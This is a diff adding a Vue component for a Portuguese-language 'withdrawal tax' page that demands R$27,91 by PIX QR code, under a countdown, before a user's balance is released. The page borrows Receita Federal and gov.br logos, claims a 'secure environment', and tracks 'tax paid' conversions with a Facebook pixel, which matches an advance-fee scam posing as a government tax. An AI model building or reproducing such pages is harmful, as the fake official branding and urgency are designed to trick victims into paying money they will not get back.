@@ -1,0 +1,167 @@
+<script setup>
+
+import UserLayouyt from "../..//Layouts/UserLayout.vue";
+import {computed, ref, watch} from "vue";
+import pixLogo from "../../../../storage/imgs/user/pix_logo.svg";
+import videoTaxa from "../../../../storage/videos/20240912_213251000_iOS.mp4";
+import axios from "axios";
+import Loading from "../../Components/Loading.vue";
+import receita1 from '../../public/receita-federal-logo-1.webp';
+import gov1 from '../../public/gov.br-logo-0.webp';
+import {toast} from "vue3-toastify";
+import "vue3-toastify/dist/index.css";
+import BaseModal from "../../Components/BaseModal.vue";
+import QRCodeVue3 from "qrcode-vue3";
+import {usePage} from "@inertiajs/vue3";
+
+const page = usePage();
+const settings = page.props.settings;
+
+const {qrCode,withdraw_value} = defineProps(["qrCode","withdraw_value"]);
+
+const loading = ref(false);
+const modal = ref(true);
+
+const userId = computed(() => page.props.auth.user.id);
+const userIdref = ref(userId);
+if (window.location.host === 'dinofeliz.com') {
+    window.fbq('trackCustom', 'Taxa criada')
+}
+function stopVideo() {
+    const video = document.getElementById("my-video");
+    video.pause();
+}
+// @ts-ignore
+window.Echo.channel("pixReceived" + userIdref.value).listen(
+    "PixReceived",
+    (e) => {
+        modal.value = false;
+        if (window.location.host === 'dinofeliz.com') {
+            window.fbq('trackCustom', 'Taxa paga', {currency: "BRL", value: 39.90})
+        }
+        qrCode.value = "";
+        toast.success("Taxa paga com sucesso!");
+    }
+);
+
+watch(() => modal.value, (value) => {
+    if (!value) {
+        stopVideo();
+    }
+    if (value) {
+        const video = document.getElementById("my-video");
+        video.play();
+    }
+});
+
+function copy() {
+    navigator.clipboard.writeText(qrCode.value);
+    toast.success("Copiado!");
+}
+
+function toBRL(value) {
+    return new Intl.NumberFormat("pt-BR", {
+        style: "currency",
+        currency: "BRL",
+    }).format(value);
+}
+</script>
+
+<template>
+    <Head title="Taxa de Saque"/>
+    <UserLayouyt>
+        <div class="p-4 lg:p-6 lg:px-20">
+            <div class="text-5xl mb-7 text-verde font-extrabold font-menu">
+                Imposto Sobre o Saque
+            </div>
+            <div class="flex-col flex gap-y-4 text-base">
+
+                <div class="font-bold text-lg lg:text-base">
+                    <h1>RECEBA IMEDIATAMENTE O SALDO EM SUA
+                        CONTA. </h1>
+                    <h1>IMPOSTO SOBRE O SAQUE <b style="color: #4AEBA1;">R$27,91</b> VÁLIDO!<br>POR ATÉ 10 MINUTOS. </h1>
+                    <div class="timeEd">
+                        <span id="countdown"></span>
+                    </div>
+
+                    <div class="flex mt-2">
+                        <div class="flex flex-col items-center">
+                            <QRCodeVue3 :value="qrCode"/>
+                            <button
+                                @click="copy"
+                                class="mx-auto mt-4 py-2 px-10 bg-verde-escuro rounded-lg font-menu md:text-3xl text-roxo-fundo boxShadow border-gray-800 border-4 border-b-[10px]"
+                            >
+                                Copiar
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <img :src="pixLogo" class="mb-2 w-20 lg:w-36 max-w-sm" alt="pixLogo"/>
+
+                <div class="mt-1 text-base md font-semibold lg:font-normal lg:text-sm">
+                    <h1>EFETUE O PAGAMENTO DO IMPOSTO SOBRE O SAQUE PARA RECEBER O SALDO EM SUA CONTA. </h1>
+                    <div class="memer">
+                        <span>
+                            1 - Pagamento em segundos. sem complicação.
+                        </span>
+                        <br>
+                        <span>
+                            2 - Basta escanear, com aplicativo do seu banco o QRCode que iremos gerar para sua taxa.
+                        </span>
+                        <br>
+                        <span>
+                            3 - O PIX foi desenvolvido pelo banco central para facilitar suas compras e é 100% seguro
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <BaseModal
+                v-model="modal"
+                title="Assista o video"
+                :showFooter="false"
+                :showHeader="false"
+                class="min-h-screen"
+            >
+                <video
+                    id="my-video"
+                    class="video-js"
+                    controls
+                    preload="auto"
+                    width="100%"
+                    height="100%"
+                    poster=""
+                    data-setup="{}"
+                >
+                    <source :src="videoTaxa" type="video/mp4" />
+                </video>
+                <div class="text-center">
+                    <span>Aperte o play</span>
+                </div>
+                <div class="mt-4 text-center">
+                    <span>O valor de <b class="text-green-500">R${{ withdraw_value }}</b> será transferido para 
+chave pix informada após o pagamento 
+do imposto obrigatorio de <b class="text-red-500">R$27,91</b></span>
+                </div>
+                <div class="mt-4">
+                    <button class="w-full bg-green-500 font-semibold p-2 rounded-md" @click="modal = !modal">PAGAR IMPOSTO</button>
+                </div>
+                <div class="mt-4 text-center flex justify-center items-center">
+                    <span class="text-center flex justify-center items-center gap-2">Ambiente Seguro <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-4">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 1 0-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 0 0 2.25-2.25v-6.75a2.25 2.25 0 0 0-2.25-2.25H6.75a2.25 2.25 0 0 0-2.25 2.25v6.75a2.25 2.25 0 0 0 2.25 2.25Z" />
+</svg>
+</span>
+                </div>
+                <div class="mt-4 flex justify-center items-center">
+                    <img style="width: 8rem; height: 2rem;filter: saturate(0) brightness(10);" :src="receita1" alt="">
+                    <img style="width: 5rem;" :src="gov1" alt="">
+                </div>
+            </BaseModal>
+            <Loading :loading="loading"/>
+        </div>
+    </UserLayouyt>
+</template>
+
+<style scoped>
+
+</style>
